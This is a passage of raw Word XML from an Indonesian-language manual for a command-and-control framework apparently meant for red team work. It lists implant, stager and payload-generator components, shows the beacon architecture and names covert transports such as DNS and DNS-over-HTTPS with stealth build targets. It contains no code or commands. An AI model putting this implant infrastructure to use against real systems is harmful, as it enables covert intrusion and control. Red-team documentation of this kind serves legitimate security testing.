                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Advanced Techniques (BOF / Registry / Stager)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="850"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>49</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Bagian 19</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="6236"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Skenario Red Team End-to-End</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="850"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>52</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Bagian 20</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="6236"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>OPSEC Checklist &amp; Best Practices</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="850"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>57</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="360" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>BAGIAN 1 — PENDAHULUAN &amp; ARSITEKTUR</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="8" w:space="1" w:color="C0392B"/>
        </w:pBdr>
        <w:spacing w:before="0" w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:i w:val="0"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Taburtuai C2 adalah Command &amp; Control framework yang dirancang untuk mendukung operasi red team dan adversary simulation. Framework ini mengimplementasikan teknik-teknik yang digunakan oleh threat actor nyata, sehingga memungkinkan tim keamanan untuk menguji ketahanan pertahanan mereka secara realistis.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>Komponen Utama</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:type="auto" w:w="0"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3025"/>
        <w:gridCol w:w="3025"/>
        <w:gridCol w:w="3025"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F1F1F"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Komponen</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5102"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F1F1F"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Peran</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F1F1F"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Lokasi</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>C2 Server</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5102"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Menerima check-in agent, menyimpan perintah, mengelola operator</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>bin/server</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Agent (Implant)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5102"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Berjalan di target, eksekusi perintah, kirim hasil ke server</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>bin/agent_*.exe</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Operator CLI</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5102"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Interface untuk operator mengirim perintah dan membaca output</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>bin/operator</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Stager</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5102"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Payload kecil yang men-download dan menjalankan agent penuh</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>bin/stager_*.exe</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Payload Generator</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5102"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Generate agent dengan konfigurasi build-time custom</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>bin/generate</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>Arsitektur Komunikasi</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:i w:val="0"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Komunikasi antara agent dan server bersifat asimetris: agent melakukan polling (HTTP GET) ke server secara berkala untuk mengambil perintah, lalu mengirimkan hasilnya via HTTP POST. Semua payload dienkripsi dengan AES-256-GCM menggunakan kunci yang baked-in saat build.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>[Operator CLI]  ──POST──►  [C2 Server :8080]  ◄──GET (beacon)──  [Agent]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">                                    │                                   │</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">                             [SQLite Store]               [Target Network]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">                             [CommandQueue]          (eksekusi perintah lokal)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>Transport yang Didukung</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:type="auto" w:w="0"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2269"/>
        <w:gridCol w:w="2269"/>
        <w:gridCol w:w="2269"/>
        <w:gridCol w:w="2269"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F1F1F"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Transport</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F1F1F"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Port</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3402"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F1F1F"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Kapan Digunakan</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F1F1F"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Build Target</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>HTTP (default)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>8080</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3402"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Jaringan terbuka, testing</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>agent-win-stealth</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>HTTPS / TLS</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>8443</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3402"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Production, enkripsi in-transit</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>agent-win-stealth --tls</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>WebSocket</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>8081</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3402"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Butuh latensi rendah (&lt;1 detik)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>agent-win-ws</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>DNS Authoritative</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>5353/53</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3402"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Hanya DNS outbound yang diizinkan</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>agent-win-dns</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>DNS-over-HTTPS (DoH)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>443</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3402"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Filter ketat, via resolver publik</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>agent-win-doh</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
